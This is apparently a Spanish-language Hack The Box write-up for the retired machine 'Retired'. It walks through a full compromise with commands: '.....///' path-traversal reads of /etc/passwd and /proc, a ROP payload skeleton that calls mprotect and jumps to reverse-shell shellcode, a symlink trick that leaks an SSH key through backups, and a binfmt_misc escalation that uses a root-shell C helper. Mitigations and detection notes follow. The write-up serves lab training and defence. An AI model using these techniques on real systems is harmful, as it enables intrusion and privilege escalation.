---
machine: Retired
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [linux, web, file-read, buffer-overflow, rop, binfmt-misc, capabilities]
---

# Retired — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (13/08/2022). Ficha de referencia; no jugada en este perfil.
> Sin flags, direcciones ni cadenas ROP reales.

## TL;DR

Un `readfile()` en PHP permite leer ficheros arbitrarios y descargar el binario `activate_license`. El binario escucha en un puerto local, recibe un fichero y copia una longitud controlada en un buffer de 512 bytes: un desbordamiento de pila. Se usa ROP para llamar a `mprotect`, marcar la pila como ejecutable y saltar a shellcode. Con la shell de `www-data`, un symlink en el directorio de backups entrega la clave SSH de `dev`. La escalada es `binfmt_misc`: `reg_helper` tiene `cap_dac_override` y permite registrar un intérprete con el flag `C`, que hereda los privilegios de un binario setuid.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 22,80 <TARGET_IP>
```

| Puerto | Servicio | Observación |
|---|---|---|
| 22/tcp | SSH | Acceso posterior como `dev` |
| 80/tcp | HTTP | PHP con `index.php?page=` |

## Enumeración web

```bash
feroxbuster -u http://<TARGET_IP> -x php,html
curl -s 'http://<TARGET_IP>/index.php?page=index' | head
```

`page` se concatena en una ruta y se sirve con `readfile()`. No es un LFI que ejecute PHP: el contenido se imprime, no se interpreta. Un recorrido con `.....///` repetido permite salir del directorio web.

```bash
curl -s 'http://<TARGET_IP>/index.php?page=css/.....///.....///.....///.....///etc/passwd'
```

La página menciona `activate_license`. Se localiza y se descarga:

```bash
curl -s 'http://<TARGET_IP>/index.php?page=css/.....///.....///.....///.....///usr/bin/activate_license' \
  -o activate_license
file activate_license
checksec --file=activate_license
```

## Foothold

### 1. Entender el binario

`activate_license` abre un socket local, lee un entero de 4 bytes con la longitud y copia esa cantidad en un buffer de 512 bytes. La longitud no se valida: es un desbordamiento clásico.

```bash
strings -a activate_license | head -40
objdump -d -M intel activate_license | grep -A20 '<main>'
```

La web tiene `activate_license.php`, que permite subir un fichero y lo envía al proceso. El PID cambia en cada arranque; se localiza leyendo `/proc/<pid>/cmdline` a través del file read.

```bash
for p in $(seq 1 2000); do
  curl -s "http://<TARGET_IP>/index.php?page=css/.....///.....///.....///.....///proc/$p/cmdline" \
    | grep -q activate_license && echo "PID=$p"
done
```

Con el PID se leen `/proc/<pid>/maps` y `/proc/<pid>/stack` para obtener las bases de las librerías.

### 2. Construir el exploit

Protecciones habituales: NX activo, sin canary útil en esta función, PIE en el binario pero librerías mapeadas con direcciones conocidas. La estrategia:

1. Rellenar hasta el return address.
2. Gadgets `pop rdi; ret`, `pop rsi; ret`, `pop rdx; ret` para los argumentos.
3. Llamar a `mprotect(stack_page, 0x1000, PROT_READ|WRITE|EXEC)`.
4. Saltar a `jmp rsp`.
5. Shellcode de reverse shell.

```python
payload  = b'A' * offset
payload += p64(pop_rdi) + p64(stack_page)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect)
payload += p64(jmp_rsp)
payload += shellcode
```

Se sube el payload con `activate_license.php` y se recibe la shell como `www-data`. No se publican offsets ni direcciones concretas: dependen del binario y del arranque.

## Movimiento lateral / usuario

En el sistema hay un script de backup que se ejecuta como `dev` y archiva el directorio web. El directorio es escribible por `www-data`, así que se coloca un symlink a `/home/dev/.ssh`:

```bash
ln -s /home/dev/.ssh /var/www/html/.ssh
```

El siguiente backup incluye la clave privada. Se descarga el archivo, se extrae y se usa para SSH:

```bash
tar -xf backup.tar.gz
chmod 600 id_rsa
ssh -i id_rsa dev@<TARGET_IP>
```

## Escalada de privilegios

```bash
getcap /usr/lib/emuemu/reg_helper
# cap_dac_override=ep
```

`reg_helper` lee de stdin y escribe en `/proc/sys/fs/binfmt_misc/register` con `cap_dac_override`, por lo que puede registrar formatos aunque el usuario no sea root. Se compila un intérprete que lanza bash:

```c
#include <unistd.h>
int main(void) {
    setresuid(0, 0, 0);
    char *argv[] = {"/bin/bash", "-p", NULL};
    execve(argv[0], argv, NULL);
    return 1;
}
```

```bash
gcc -o /dev/shm/h handler.c
```

Se registra una regla que coincide con los primeros bytes de un binario setuid (`newgrp`) y se usa el flag `C`:

```bash
MAGIC=$(head -c 30 /usr/bin/newgrp | xxd -p | sed 's/../\\x&/g')
echo ":x:M::$MAGIC::/dev/shm/h:C" | /usr/lib/emuemu/reg_helper
newgrp
```

`C` hace que `binfmt_misc` aplique las credenciales del **binario** (setuid root), no las del intérprete. Al ejecutar `newgrp`, el kernel llama a `/dev/shm/h` como root. Limpieza:

```bash
echo -1 > /proc/sys/fs/binfmt_misc/x
```

## Evidencia

- `readfile()` devolviendo `/etc/passwd` y el binario.
- `checksec` y desensamblado de la función vulnerable.
- Shell de `www-data` y posterior SSH como `dev`.
- `getcap` sobre `reg_helper`.
- `id` como root tras ejecutar `newgrp`.

## Lecciones aprendidas

- Un file read sin ejecución sigue siendo crítico: permite descargar binarios y leer `/proc`.
- El desbordamiento no está en el servicio web, sino en un binario local al que la web puede enviar datos.
- Un backup que sigue symlinks convierte un directorio escribible en lectura de claves SSH.
- `binfmt_misc` con `C` es una vía de escalada cuando un helper con capacidades escribe en `register`.
- `cap_dac_override` sobre un binario que escribe un fichero del kernel es, en la práctica, root.

## Mitigaciones y detección

- Validar la longitud antes de `read()` y usar funciones seguras; compilar con `-fstack-protector-all`, `-D_FORTIFY_SOURCE=2`, PIE y RELRO completo.
- No ejecutar backups como un usuario con acceso a claves; usar `tar --no-recursion` y no seguir symlinks.
- Revisar capacidades (`getcap -r /`) y eliminar `cap_dac_override` de helpers.
- Detección: escrituras en `/proc/sys/fs/binfmt_misc/register`, ejecución de intérpretes en `/dev/shm`, `newgrp` inusual y procesos con `cap_dac_override`.
- Auditar cambios en directorios web y backups.

MITRE: T1190, T1068, T1548, T1552.004.

## Referencias

- <https://0xdf.gitlab.io/2022/08/13/htb-retired.html>
- <https://man7.org/linux/man-pages/man5/binfmt_misc.5.html>
- <https://man7.org/linux/man-pages/man7/capabilities.7.html>
